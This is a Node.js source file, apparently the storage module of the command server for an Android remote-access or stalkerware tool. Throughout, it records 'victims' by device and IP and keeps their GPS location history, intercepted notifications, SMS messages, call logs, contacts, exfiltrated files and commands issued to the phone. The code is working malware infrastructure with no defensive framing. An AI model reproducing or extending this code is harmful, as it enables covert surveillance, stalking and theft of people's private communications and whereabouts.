const path = require('path');
const fs = require('fs');

/**
 * Simple JSON-based database manager
 * Lưu trữ dữ liệu vào JSON files thay vì SQLite
 */
class DatabaseManager {
  constructor() {
    this.dataDir = path.join(__dirname, 'data');
    this.initialized = false;

    // Ensure data directory exists
    if (!fs.existsSync(this.dataDir)) {
      fs.mkdirSync(this.dataDir, { recursive: true });
    }

    // Initialize data structure
    this.data = {
      victims: {},
      locations: {},
      notifications: {},
      sms: {},
      callLogs: {},
      contacts: {},
      files: {},
      commands: {}
    };

    this.loadData();
    this.initialized = true;
    console.log('✅ Database initialized at:', this.dataDir);
  }

  async init() {
    // For compatibility with async initialization
    return Promise.resolve();
  }

  loadData() {
    const dataFile = path.join(this.dataDir, 'database.json');
    if (fs.existsSync(dataFile)) {
      try {
        const content = fs.readFileSync(dataFile, 'utf8');
        this.data = JSON.parse(content);
        console.log('✅ Database loaded from file');
      } catch (error) {
        console.error('Error loading database:', error.message);
      }
    }
  }

  save() {
    const dataFile = path.join(this.dataDir, 'database.json');
    try {
      fs.writeFileSync(dataFile, JSON.stringify(this.data, null, 2), 'utf8');
    } catch (error) {
      console.error('Error saving database:', error.message);
    }
  }

  // ==================== VICTIMS ====================
  addOrUpdateVictim(id, ip, port, country, manufacturer, model, androidVersion) {
    if (!this.data.victims[id]) {
      this.data.victims[id] = {
        id,
        ip,
        port,
        country,
        manufacturer,
        model,
        android_version: androidVersion,
        first_seen: new Date().toISOString(),
        last_seen: new Date().toISOString(),
        total_connections: 1,
        is_online: 1
      };
    } else {
      this.data.victims[id].ip = ip;
      this.data.victims[id].port = port;
      this.data.victims[id].last_seen = new Date().toISOString();
      this.data.victims[id].total_connections++;
      this.data.victims[id].is_online = 1;
    }
    this.save();
  }

  setVictimOffline(id) {
    if (this.data.victims[id]) {
      this.data.victims[id].is_online = 0;
      this.data.victims[id].last_seen = new Date().toISOString();
      this.save();
    }
  }

  getVictim(id) {
    return this.data.victims[id] || null;
  }

  getAllVictims() {
    return Object.values(this.data.victims).sort((a, b) =>
      new Date(b.last_seen) - new Date(a.last_seen)
    );
  }

  getOnlineVictims() {
    return Object.values(this.data.victims)
      .filter(v => v.is_online === 1)
      .sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));
  }

  // ==================== LOCATIONS ====================
  addLocation(victimId, latitude, longitude, accuracy = null) {
    if (!this.data.locations[victimId]) {
      this.data.locations[victimId] = [];
    }
    this.data.locations[victimId].push({
      latitude,
      longitude,
      accuracy,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  getLocationHistory(victimId, limit = 100) {
    const locations = this.data.locations[victimId] || [];
    return locations.slice(-limit).reverse();
  }

  getLastLocation(victimId) {
    const locations = this.data.locations[victimId] || [];
    return locations.length > 0 ? locations[locations.length - 1] : null;
  }

  // ==================== NOTIFICATIONS ====================
  addNotification(victimId, packageName, appName, title, content) {
    if (!this.data.notifications[victimId]) {
      this.data.notifications[victimId] = [];
    }
    this.data.notifications[victimId].push({
      package_name: packageName,
      app_name: appName,
      title,
      content,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  getNotifications(victimId, limit = 100) {
    const notifications = this.data.notifications[victimId] || [];
    return notifications.slice(-limit).reverse();
  }

  // ==================== SMS ====================
  addSMS(victimId, phoneNumber, message, type, timestamp) {
    if (!this.data.sms[victimId]) {
      this.data.sms[victimId] = [];
    }
    this.data.sms[victimId].push({
      phone_number: phoneNumber,
      message,
      type,
      timestamp,
      retrieved_at: new Date().toISOString()
    });
    this.save();
  }

  getSMSHistory(victimId, limit = 100) {
    const sms = this.data.sms[victimId] || [];
    return sms.slice(-limit).reverse();
  }

  // ==================== CALL LOGS ====================
  addCallLog(victimId, phoneNumber, contactName, callType, duration, timestamp) {
    if (!this.data.callLogs[victimId]) {
      this.data.callLogs[victimId] = [];
    }
    this.data.callLogs[victimId].push({
      phone_number: phoneNumber,
      contact_name: contactName,
      call_type: callType,
      duration,
      timestamp,
      retrieved_at: new Date().toISOString()
    });
    this.save();
  }

  getCallLogs(victimId, limit = 100) {
    const calls = this.data.callLogs[victimId] || [];
    return calls.slice(-limit).reverse();
  }

  // ==================== CONTACTS ====================
  addContact(victimId, contactName, phoneNumber, email = null) {
    if (!this.data.contacts[victimId]) {
      this.data.contacts[victimId] = [];
    }

    // Check for duplicates
    const exists = this.data.contacts[victimId].some(c => c.phone_number === phoneNumber);
    if (!exists) {
      this.data.contacts[victimId].push({
        contact_name: contactName,
        phone_number: phoneNumber,
        email,
        retrieved_at: new Date().toISOString()
      });
      this.save();
    }
  }

  getContacts(victimId) {
    return (this.data.contacts[victimId] || []).sort((a, b) =>
      (a.contact_name || '').localeCompare(b.contact_name || '')
    );
  }

  // ==================== FILES ====================
  addFile(victimId, filePath, fileName, fileSize, localPath) {
    if (!this.data.files[victimId]) {
      this.data.files[victimId] = [];
    }
    this.data.files[victimId].push({
      file_path: filePath,
      file_name: fileName,
      file_size: fileSize,
      local_path: localPath,
      downloaded_at: new Date().toISOString()
    });
    this.save();
  }

  getFiles(victimId, limit = 100) {
    const files = this.data.files[victimId] || [];
    return files.slice(-limit).reverse();
  }

  // ==================== COMMANDS ====================
  addCommand(victimId, commandType, commandData) {
    if (!this.data.commands[victimId]) {
      this.data.commands[victimId] = [];
    }
    this.data.commands[victimId].push({
      command_type: commandType,
      command_data: JSON.stringify(commandData),
      executed_at: new Date().toISOString()
    });
    this.save();
  }

  getCommands(victimId, limit = 100) {
    const commands = this.data.commands[victimId] || [];
    return commands.slice(-limit).reverse();
  }

  // ==================== STATISTICS ====================
  getVictimStats(victimId) {
    return {
      victim: this.getVictim(victimId),
      totalLocations: (this.data.locations[victimId] || []).length,
      totalNotifications: (this.data.notifications[victimId] || []).length,
      totalSMS: (this.data.sms[victimId] || []).length,
      totalCalls: (this.data.callLogs[victimId] || []).length,
      totalContacts: (this.data.contacts[victimId] || []).length,
      totalFiles: (this.data.files[victimId] || []).length,
      totalCommands: (this.data.commands[victimId] || []).length,
      lastLocation: this.getLastLocation(victimId)
    };
  }

  // ==================== CLEANUP ====================
  deleteVictimData(victimId) {
    delete this.data.victims[victimId];
    delete this.data.locations[victimId];
    delete this.data.notifications[victimId];
    delete this.data.sms[victimId];
    delete this.data.callLogs[victimId];
    delete this.data.contacts[victimId];
    delete this.data.files[victimId];
    delete this.data.commands[victimId];
    this.save();
  }

  close() {
    this.save();
  }
}

module.exports = DatabaseManager;
